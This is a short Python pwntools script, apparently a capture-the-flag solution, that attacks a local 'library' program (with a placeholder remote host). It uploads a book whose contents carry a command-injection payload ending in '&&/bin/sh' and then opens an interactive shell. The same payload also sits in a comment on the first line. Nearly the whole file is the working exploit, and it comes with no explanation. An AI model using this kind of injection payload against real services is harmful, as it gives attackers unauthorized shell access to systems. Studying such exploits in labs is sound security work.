#BBBB1234567891234567891234567'&&/bin/sh'
g_local = True

from pwn import *

if g_local:
	sh=process("./library")
else:
	sh=remote("xxxx",1234)


def upload_book(filename, content):
	filename += ".bk"
	sh.send("1\n")
	sh.recvuntil("Book filename: ")
	print filename
	sh.send(filename + "\n")
	sh.recvuntil("e-book contents: \n")
	sh.send(content)
	sh.recvuntil("Enter command: ")

def list_books_and_shell():
	sh.send("2\n")
	sh.interactive()

upload_book("1", "BBBB1234567891234567891234567\'&&/bin/sh\'\x00")
list_books_and_shell()